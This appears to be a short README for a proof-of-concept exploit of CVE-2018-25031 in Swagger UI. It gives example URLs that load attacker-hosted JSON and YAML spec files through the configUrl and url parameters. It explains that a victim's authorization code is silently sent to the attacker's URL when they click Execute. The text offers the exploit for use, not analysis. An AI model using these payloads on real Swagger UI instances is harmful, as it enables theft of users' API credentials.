You can use it with the XSS Vulnerability https://github.com/VictorNS69/swagger-ui-xss

It is necessary to find the parameter and assign the correct file: for <b>configUrl</b>, the JSON file, and for <b>url</b>, the YAML file.

## Example:
```
https://<URL>/?configUrl=https://raw.githubusercontent.com/geozin/POC-CVE-2018-25031/main/doc.json
https://<URL>/?url=https://raw.githubusercontent.com/geozin/POC-CVE-2018-25031/main/doc.yaml
```

When the victim tries to use the API by entering the Authorization Code and clicks <b>Execute</b>, nothing will be displayed to them. However, a request with Authorization Code will be sent to the attacker's URL.
